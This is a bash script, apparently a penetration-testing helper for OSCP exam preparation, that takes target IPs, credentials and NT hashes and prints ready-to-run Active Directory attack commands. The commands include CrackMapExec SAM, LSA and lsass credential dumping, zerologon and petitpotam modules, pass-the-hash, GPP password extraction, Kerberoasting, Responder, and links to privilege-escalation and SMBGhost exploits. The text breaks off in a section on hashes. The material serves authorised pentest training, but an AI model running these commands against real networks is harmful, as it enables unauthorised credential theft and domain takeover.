#!/bin/bash
# Created by Martijn Kamminga
# v1.0 on 10/15/2022
# v1.1 on 01/15/2023
# v2.0 on 02/06/2023
# v2.1 on 03/09/2023
# www.isee2it.nl
scriptlocation=$(echo -n $PWD)

logo(){
	echo -e "\e[96m   ____   _____  _____ _____     _____ __  __ _____     ";
	echo -e "\e[96m  / __ \ / ____|/ ____|  __ \   / ____|  \/  |  __ \    ";
	echo -e "\e[96m | |  | | (___ | |    | |__) | | |    | \  / | |  | |   ";
	echo -e "\e[96m | |  | |\___ \| |    |  ___/  | |    | |\/| | |  | |   ";
	echo -e "\e[96m | |__| |____) | |____| |      | |____| |  | | |__| |   ";
	echo -e "\e[96m  \____/|_____/ \_____|_|       \_____|_|  |_|_____/    ";
	echo -e "\e[96m ";
	echo -e "\e[96m \e[0m ";
	echo -e "\e[96m              Follow me on twitter: @xmakamx \e[0m ";
	echo
	echo "   Syntax: ./oscpcmd.sh | Help: ./oscpcmd.sh -h"
}
logo

# Fonts
bold=$(tput bold)
normal=$(tput sgr0)
date=$(TZ="CET" date '+%Y-%m-%d-%H-%M-%S')

if [ ! -d $scriptlocation/vars ]; then
	mkdir $scriptlocation/vars
fi

if [ ! -d $scriptlocation/nmap ]; then
	mkdir $scriptlocation/nmap
fi

Help()
{
echo -e "\e[96m" 
echo "   Explanation:"
echo   
echo "   This tool semi-auto-generates commands for you based on the input of variables"
echo
echo "   1. The local adapter can be /eth/tun0 or any other name for your adapter"
echo "   6. Additionally: when you want to input the IP of your pentestbox, use the manual option 6"
echo
echo "   2. There can only be 1 active host. Adjust when needed e.g. when pivoting"
echo
echo "   3. The mulitple host section let's you define a scope"
echo
echo "   4. The Set AD Server automatically queries the scope for AD presence"
echo
echo "   5. The Set Credentials allows for you to set: Username/Password/LM:NT hash"
echo
echo "   6. You will be asked a bunch of questions for Host/IP/FQDN/Suffix and Credentials"
echo
echo "   7. Prefix the most important and usable commands with the 'proxychains' command"
echo
echo "   8. This menu allows you to use the bunch of tools pre-generated on information above"
echo -e "\e[0m "
echo "   9. Quit and say goodbye"
echo
echo -e "\e[31m ${bold}  The Tooling menu:\e[30m ${normal}"
echo -e "\e[32m"
echo "   In Menu 8 you will find various tools and submenu's to craft commands for use"
echo
echo "   This menu is based on de AD Pentesting MindMap Graphic by orange-cyberdefense"
echo
echo "   Serveral tools are listed in the vulnerable, repositories and the Help section"
echo
echo "   Diverse tooling can be found in each menu with their description respectfully"
echo
echo "   Menu 15,16 are the Web Server en MSFconsole sections which requires your attention"
echo
echo "   I hope to have been of help and you can report any errors on: https://github.com/xmakamx/enum-oscp/issues"
echo
echo -e "\e[0m "


}

while getopts ":h,--help" option; do
   case $option in
      h | --help)
         Help
         exit;;

   esac
done



SETIP() {
echo "   [+] The following IP will be used: `cat $scriptlocation/vars/ip.txt`"
Choices
}

CheckAdapter() {
read -p "[+] What is the name of the active adapter (eth0/ens33/tun0):" adapter

echo $adapter

touch $scriptlocation/vars/ip.txt
ip a show dev $adapter | grep -w inet | awk '{print $2}' | sed 's/\/.*//g' > $scriptlocation/vars/ip.txt
ConfirmAdapter
}

ConfirmAdapter() {
if [ ! -f $scriptlocation/vars/ip.txt ];then
	touch $scriptlocation/vars/ip.txt
fi
cat $scriptlocation/vars/ip.txt
read -p "[i] Is this the correct ip? `cat $scriptlocation/vars/ip.txt` (yY/nN)" setip
case "$setip" in
  y|Y ) SETIP ;;
  n|N ) CheckAdapter ;;
  * ) echo "   Invalid";;
esac
}

Manually() {
echo "   Set the adapter IP address in `echo $scriptlocation/vars/ip.txt`"
Choices
}

AdapterChoice() {
read -p "[?] Set the adapter (yY/nN)" setadapter
case "$setadapter" in
  y|Y ) CheckAdapter ;;
  n|N ) Manually ;;
  * ) echo "   Invalid";;
esac
}

Active() {
touch $scriptlocation/vars/ActiveHost.txt
read -p "Please Enter the Active Host:"$'\n' ActiveHost

echo $ActiveHost > $scriptlocation/vars/ActiveHost.txt
Choices
}

Multiple() {
read -p "Please Enter the IP Addresses in one line , or ; seperated:"$'\n' IPscope
echo $IPscope | sed 's/, /\n/g' | sed 's/,/\n/g' | sed 's/;/\n/g' | sed 's/^"//' | sed 's/"$//' | sed 's/ /\n/g' > $scriptlocation/vars/IPscope.txt
Choices
}

SetCreds(){
touch $scriptlocation/vars/ActiveUsername.txt
read -p "Please Enter the valid username:"$'\n' ActiveUsername

echo $ActiveUsername > $scriptlocation/vars/ActiveUsername.txt

touch $scriptlocation/vars/ActivePass.txt
read -p "Please Enter the valid password:"$'\n' ActivePass

echo $ActivePass > $scriptlocation/vars/ActivePass.txt

touch $scriptlocation/vars/hash.txt
read -p "Please Enter the valid hash in LM:NT format :"$'\n' hash

echo $hash > $scriptlocation/vars/hash.txt

touch $scriptlocation/vars/nthash.txt
cat $scriptlocation/vars/hash.txt | cut -f2 -d':' > $scriptlocation/vars/nthash.txt

Choices
}

SetAD(){

touch $scriptlocation/vars/ADIP.txt
touch $scriptlocation/vars/ADHostname.txt

echo "   Scanning Active Directory IP"
nmap -Pn -p389,3389 -A -iL $scriptlocation/vars/IPscope.txt --open -oA $scriptlocation/nmap/ADserver
cat $scriptlocation/nmap/ADserver.gnmap | grep 'Up' | awk '{print $2}' > $scriptlocation/vars/ADIP.txt
cat $scriptlocation/nmap/ADserver.nmap | grep 'NetBIOS_Computer_Name: ' | awk '{print $3}' > $scriptlocation/vars/ADHostname.txt
cat $scriptlocation/nmap/ADserver.nmap | grep 'DNS_Domain_Name: ' | awk '{print $3}' > $scriptlocation/vars/ADdomain.txt
cat $scriptlocation/nmap/ADserver.nmap | grep 'NetBIOS_Computer_Name: ' | awk '{print $3}' > $scriptlocation/vars/ADHostname.txt
cat $scriptlocation/nmap/ADserver.nmap | grep 'DNS_Computer_Name:' | awk '{print $3}' > $scriptlocation/vars/fqdn.txt

touch $scriptlocation/vars/ADsuffix.txt

echo "   Generating the Active Directory Domain Controller suffix:"
cat nmap/ADserver.nmap | grep "Domain:" | awk '{print $10}' | sed 's/,//g' | sed 's/\./\t/' | awk '{print "dc=",$1,",dc=",$2}' | sed 's/ //g' > $scriptlocation/vars/ADsuffix.txt
Choices
}

SetProxyChains(){

touch $scriptlocation/vars/proxychains.txt
read -p "Enter the command 'proxychains', Enter nothing to clear:"$'\n' proxychains

echo $proxychains > $scriptlocation/vars/proxychains.txt
Choices
}

ManualSet(){

touch $scriptlocation/vars/ip.txt
read -p "Please Enter the Kali IP:"$'\n' KaliIP

echo $KaliIP > $scriptlocation/vars/ip.txt

touch $scriptlocation/vars/ActiveHost.txt
read -p "Please Enter the Active Target IP:"$'\n' ActiveHost

echo $ActiveHost > $scriptlocation/vars/ActiveHost.txt

touch $scriptlocation/vars/IPscope.txt
read -p "Please Enter the Scope IP Addresses in one line , or ; seperated:"$'\n' IPscope

echo $IPscope | sed 's/, /\n/g' | sed 's/,/\n/g' | sed 's/;/\n/g' | sed 's/^"//' | sed 's/"$//' | sed 's/ /\n/g' > $scriptlocation/vars/IPscope.txt

touch $scriptlocation/vars/ActiveUsername.txt
read -p "Please Enter the Active Username:"$'\n' ActiveUsername

echo $ActiveUsername > $scriptlocation/vars/ActiveUsername.txt

touch $scriptlocation/vars/ActivePass.txt
read -p "Please Enter the valid password:"$'\n' ActivePass

echo $ActivePass > $scriptlocation/vars/ActivePass.txt

touch $scriptlocation/vars/ADHostname.txt
read -p "Please Enter the AD Hostname:"$'\n' ADHostname

echo $ADHostname > $scriptlocation/vars/ADHostname.txt
echo $ADHostname > $scriptlocation/vars/ADdns.txt

touch $scriptlocation/vars/ADIP.txt
read -p "Please Enter the AD IP:"$'\n' ADIP

echo $ADIP > $scriptlocation/vars/ADIP.txt

touch $scriptlocation/vars/ADsuffix.txt
read -p "Please Enter the valid AD domain (e.g. dc=domain,dc=local):"$'\n' ADsuffix

echo $ADsuffix > $scriptlocation/vars/ADsuffix.txt

touch $scriptlocation/vars/ADdomain.txt
read -p "Please Enter the valid AD domain (e.g. domain.local):"$'\n' ADdomain

echo $ADdomain > $scriptlocation/vars/ADdomain.txt

touch $scriptlocation/vars/fqdn.txt
read -p "Please Enter the valid FQDN for the AD (e.g. SRV1.domain.local):"$'\n' fqdn

echo $fqdn > $scriptlocation/vars/fqdn.txt

touch $scriptlocation/vars/hash.txt
read -p "Please Enter the valid hash in LM:NT format :"$'\n' hash

echo $hash > $scriptlocation/vars/hash.txt

touch $scriptlocation/vars/nthash.txt
cat $scriptlocation/vars/hash.txt | cut -f2 -d':' > $scriptlocation/vars/nthash.txt

touch $scriptlocation/vars/proxychains.txt
read -p "Enter the command 'proxychains', Enter nothing to clear:"$'\n' proxychains

echo $proxychains > $scriptlocation/vars/proxychains.txt

ReconstructVars
Choices
}

FuncTouch(){
touch $scriptlocation/vars/ip.txt
touch $scriptlocation/vars/ActiveHost.txt
touch $scriptlocation/vars/IPscope.txt
touch $scriptlocation/vars/ActiveUsername.txt
touch $scriptlocation/vars/ActivePass.txt
touch $scriptlocation/vars/ADIP.txt
touch $scriptlocation/vars/ADHostname.txt
touch $scriptlocation/vars/ADsuffix.txt
touch $scriptlocation/vars/ADdomain.txt
touch $scriptlocation/vars/ADdns.txt
touch $scriptlocation/vars/searchinternals.txt
touch $scriptlocation/vars/msfvenom.txt
touch $scriptlocation/vars/reverseport.txt
touch $scriptlocation/vars/hash.txt
touch $scriptlocation/vars/nthash.txt
touch $scriptlocation/vars/proxychains.txt

}
FuncTouch

ReconstructVars(){
LocalIP=$(cat $scriptlocation/vars/ip.txt)
ActiveHost=$(cat $scriptlocation/vars/ActiveHost.txt)
IPScope=$(echo $scriptlocation/vars/IPscope.txt)
ActiveUsername=$(cat $scriptlocation/vars/ActiveUsername.txt)
ActivePass=$(cat $scriptlocation/vars/ActivePass.txt)
ADIP=$(cat $scriptlocation/vars/ADIP.txt)
ADHostname=$(cat $scriptlocation/vars/ADHostname.txt)
ADsuffix=$(cat $scriptlocation/vars/ADsuffix.txt)
ADdns=$(cat $scriptlocation/vars/ADdns.txt)
ADdomain=$(cat $scriptlocation/vars/ADdomain.txt)
host=$(cat $scriptlocation/vars/ADdns.txt|head -n1)
domain=$(cat $scriptlocation/vars/ADdomain.txt|head -n1)
echo $host.$domain > $scriptlocation/vars/fqdn.txt
FQDN=$(cat $scriptlocation/vars/fqdn.txt)
executable=$(cat $scriptlocation/vars/searchinternals.txt)
MSFVENOM=$(cat $scriptlocation/vars/msfvenom.txt)
PORT=$(cat $scriptlocation/vars/reverseport.txt)
HASH=$(cat $scriptlocation/vars/hash.txt)
NTHash=$(cat $scriptlocation/vars/nthash.txt)
ProxyChains=$(cat $scriptlocation/vars/proxychains.txt)
}


nmapCommands(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Active Single Host ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   [+] ping scan single host"
echo "   nmap -sP -p `cat $scriptlocation/vars/ActiveHost.txt`"
echo
echo "   sudo nmap -Pn -p- -T4 ${ActiveHost} -oA ~/workfolder/nmap/${ActiveHost}_TCPall"
echo
echo "   sudo nmap -Pn -p80,443,445,8080 -sVC -T4 $ActiveHost -oA ~/workfolder/nmap/${ActiveHost}_TCPServicePorts" 
echo
echo "   sudo nmap -Pn -p- -sU -T4 ${ActiveHost} -oA ~/workfolder/nmap/${ActiveHost}_UDP"
echo 
echo "   sudo nmap -Pn -p- -sU -sC -sV -T4 ${ActiveHost} -oA ~/workfolder/nmap/${ActiveHost}_UDP_ServiceScan"
echo
echo "   nmap -Pn --top-ports 50 --open ${ActiveHost}"
echo
echo "   nmap -Pn --script smb-vuln* -p139,445 ${ActiveHost}"
echo
echo "  $ProxyChains nmap -sT -Pn -v -iL ${ActiveHost}" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] All Multiple Hosts ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   [+] ping scan multiple hosts"
echo "   nmap -sP -p -iL `echo $scriptlocation/vars/IPscope.txt`" 
echo
echo "   sudo nmap -Pn -p- -T4 ${IPScope} -oA ~/workfolder/nmap/TCPAllHostsAllPorts"
echo 
echo "   sudo nmap -Pn -p80,443,445,8080 -sVC -T4 -iL $IPScope -oA ~/workfolder/nmap/TCPAllHostsAllServicesAllPorts"           
echo
echo "   sudo nmap -Pn -p- -sU -T4 -iL $IPScope -oA ~/workfolder/nmap/UDPAllHostsAllPorts"
echo
echo "   sudo nmap -Pn -p- -sU -sC -sV -T4 -iL $IPScope -oA ~/workfolder/nmap/UDPAllHostsAllServicesAllPorts"   
echo

}

CrackMapExecNull() {
echo
echo "   Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc" 
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Single Host ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   crackmapexec smb $ActiveHost"
echo "   [+] ANONYMOUS" 
echo "  $ProxyChains crackmapexec smb $ActiveHost -u anonymous -p ''"
echo "   [+] NULL SESSION" 
echo "  $ProxyChains crackmapexec smb $ActiveHost -u '' -p ''"
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Multiple Hosts ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo "   crackmapexec smb $IPScope" 
echo "   [+] # ANONYMOUS"
echo "  $ProxyChains crackmapexec smb $IPScope -u anonymous -p ''"
echo "   [+] # NULL SESSION" 
echo "  $ProxyChains crackmapexec smb $IPScope -u '' -p ''"
}

RPCclient(){
echo "  $ProxyChains rpcclient -N -U \"\" -L \\\\$ActiveHost"
echo "  $ProxyChains rpcclient $> enumdomusers"
}

FindADIP(){
echo "   nslookup -type=SRV_ldap._tcp.dc._msdcs.//$domain/"
}

ZoneTransfer(){
echo "   dig axfr $ADdomain@$ADIP"
}

Enum4Linux(){
echo "  $ProxyChains enum4linux -a -u \"\" -p \"\" $ADIP" 
echo "  $ProxyChains enum4linux -a -u \"guest\" -p \"\" $ADIP"
}

SMBMap() {
echo "  $ProxyChains smbmap -u \"\" -p \"\" -P 445 -H $ActiveHost"
echo "  $ProxyChains smbmap -u \"guest\" -p \"\" -P 445 -H $ActiveHost"
}

SMBClient(){
echo "  $ProxyChains smbclient -N -U "" -L \\\\$ActiveHost"
echo "  $ProxyChains smbclient -U '%'  -l //$ADIP"
echo "  $ProxyChains smbclient -U 'guest%' -L //$ADIP"
}

LDAPsearch(){
echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\""
echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"userPrincipalName\""
echo "  $ProxyChains ldapsearch -v -x -D \"anonymous\" -w '' -H ldap://$ADIP -b \"$ADsuffix\" | grep \"sAMAccountName\\|userPrincipalName\\|DefaultPassword\""
echo "  $ProxyChains nmap -n -sV --script "ldap* and not brute" -p -389 $ADIP"
}

MenuPentestingAD(){
ReconstructVars
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Pentesting Active Directory ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
echo 
echo -e "\e[96m ${bold}    Scan Network ${normal}" 
echo 
nmapCommands
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    SMB + RPC ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
CrackMapExecNull
RPCclient
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    nslookup IP && ZoneTransfer ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
FindADIP
ZoneTransfer
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Guest Acccess on SMB Share ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
Enum4Linux
SMBMap
SMBClient
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    Enumerate LDAP ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
LDAPsearch
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

LowHangingFruit(){
echo "   java rmi; exploit/multi/misc/java_rmi_server"
echo
echo "   SMB: exploit/windows/smb/ms17_010_eternalblue"
echo
echo "   Tomcat: auxiliary/scanner/http/tomcat_enum"
echo "   Tomcat: exploit/mult/http/tomcat_mgr_deploy"
echo
echo "   ysoserial"
echo
echo "   searchsploit <product>"
echo
echo "   MS14-025:"
echo "  $ProxyChains findstr /S /l cpassword \\\\$FQDN\\sysvol\\$ADdomain\\policies\\*.xml"
echo
echo "   GetGPPPassword.py:"
echo "   # with cleartext credentials" 
echo "  $ProxyChains python3 /opt/impacket/examples/Get-GPPPassword.py $ADdomain/$ActiveUsername:'$ActivePass'@$FQDN"
echo
echo "   # pass-the-hash (with an NT hash)"
echo "  $ProxyChains python3 /opt/impacket/examples/Get-GPPPassword.py -hashes :$NThash $ADdomain/$ActiveUsername@$FQDN"
echo 
echo "   use admin/mssql/mssql_enum_sql_logins"
echo
echo "   ProxyLogon: https://github.com/RickGeex/ProxyLogon" 
echo "   ProxyShell: https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange-proxyshell.nse" 
}

MenuFind() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Low Hanging Fruit ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
LowHangingFruit
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

CrackMapExecAuth(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] CME Single Host ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   [+] CrackMapExec:" 
echo
echo "   List modules"
echo "   crackmapexec smb -u '' -p '' -L" 
echo
echo "   Local Authorization >"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' --local-auth"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"
echo
echo "   Domain user:"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u <USERLIST> -p '<PASS>' -d $ADdomain"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
echo "  $ProxyChains crackmapexec smb $ActiveHost -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"

echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] CME Multiple Hosts ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Local Authorization >"
echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' --local-auth"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --pass-pol"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --users" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --groups"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --sam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' --local-auth --lsa"

echo
echo "   Domain user:"
echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' -d $ADdomain"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --pass-pol"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --users" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --groups" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --sam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain --lsa"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M lsassy"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M spooler"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M zerologon"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M petitpotam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M ms17-010"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M nanodump"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M gpp_autologin"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -p '$ActivePass' -d $ADdomain -M dfscoerce"
echo

echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] CME Multiple Hosts with Hash ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
echo "   Local Authorization >"
echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' --local-auth"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --pass-pol"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --users" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --groups"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --sam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash --local-auth --lsa"

echo
echo "   Domain user:"
echo "  $ProxyChains crackmapexec smb $IPScope -u <USERLIST> -p '<PASS>' -d $ADdomain"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --pass-pol"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --users" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --groups" 
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --sam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain --lsa"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M lsassy"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M spooler"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M zerologon"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M petitpotam"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M ms17-010"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M nanodump"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M gpp_autologin"
echo "  $ProxyChains crackmapexec smb $IPScope -u $ActiveUsername -h $NTHash -d $ADdomain -M dfscoerce"
echo

}

SharpHound(){
echo "   Powershell.exe -Exec Bypass"
echo "   Import-Module .\\Sharphound.ps1"
echo "   Invoke-Bloodhound"
echo "   Invoke-BloodHound -CollectionMethod All"
echo "   ! Rever to Menu WebServer for serving file !"
}

Enum4LinuxCred(){
echo "  $ProxyChains enum4linux -u '$ActiveUsername' -p '$ActivePass' -P ${ActiveHost}"
}

AsRepRoasting(){
echo "  $ProxyChains python3 /opt/impacket/examples/GetNPUsers.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
echo "   README: https://github.com/HarmJ0y/ASREPRoast"
}

KerbeRoasting(){
echo "  $ProxyChains python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip $ADIP $ADdomain/$ActiveUsername"
echo "   README: hhttps://room362.com/post/2016/kerberoast-pt1/"
}

RubeusAttack(){
echo "   To get Rubeus you will actually need Visual Studio 2017 or anything that can compile .NET." 
echo "   git clone https://github.com/GhostPack/Rubeus" 
echo "   https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html"
echo "   ! Refer to menu Lateral Movement and WebServer for serving file !"
}


MenuUser() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) CME ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
CrackMapExecAuth
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) SharpHound.ps1 ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
SharpHound
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) Enum4Linux ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
Enum4LinuxCred
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) AsRepRoasting ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
AsRepRoasting
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) KerbeRoasting ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
KerbeRoasting
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Valid User(s) Rubeus ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
RubeusAttack
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

JuicyPotato(){
echo "   https://github.com/ohpe/juicy-potato"
echo "   https://github.com/ivanitlearning/Juicy-Potato-x86"
echo "   https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato" 
}

PrintSpoofer(){
echo "   https://github.com/itm4n/PrintSpoofer"
}

PrintNightMare(){
echo "   impacket-rpcdump $ADIP | egrep 'MS-RPRN|MS-PAR'"
}

RoquePotato(){
echo "   https://github.com/antonioCoco/RoguePotato"
}

RottenPotatoNG(){
echo "   https://github.com/breenmachine/RottenPotatoNG.git" 
}

SMBGhost(){
echo "   https://github.com/chompie1337/SMBGhost_RCE_PoC"
}

HiveNightmare(){
echo "   https://github.com/GossiTheDog/HiveNightmare"
}

SeriousSAM(){
echo "   PowerShell Version:"
echo "   https://github.com/romarroca/SeriousSam"
}

MenuPrivilege() {
ReconstructVars
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Privilege Escalation ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
echo
JuicyPotato
echo
PrintSpoofer
echo
PrintNightMare
echo
RoquePotato
echo
RottenPotatoNG
echo
SMBGhost
echo
HiveNightmare
echo
SeriousSAM
echo
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    [+] Section End: ${normal}"
echo "   -----------------------------------------------------------------------------------------   "
ShowMeMore
}

Responder(){
echo -e "\e[31m ${bold}  [!] Disclaimer!: NO SPOOFING OR POISINING IS ALLOWED ON THE EXAM [!]" 
echo "   cd /opt"
echo "   git clone https://github.com/lgandx/Responder"
echo "   sudo python /opt/Responder/Responder.py -I [interface]"
echo "   sudo python3 /opt/Responder/Responder.py -I [interface]"
}

Hashes(){
echo "   -----------------------------------------------------------------------------------------   "
echo -e "\e[96m ${bold}    LM Hash ${normal}" 
echo "   -----------------------------------------------------------------------------------------   "
